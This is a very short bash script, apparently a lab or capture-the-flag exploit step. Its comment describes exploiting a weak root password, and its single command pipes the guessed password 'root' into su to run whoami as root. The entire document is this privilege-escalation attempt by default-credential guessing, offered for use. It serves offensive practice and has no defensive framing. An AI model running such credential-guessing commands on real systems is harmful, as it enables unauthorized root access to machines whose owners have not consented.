#!/usr/bin/env bash
set -e

# Exploit weak root password: su to root with 'root'
echo 'root' | su root -c whoami
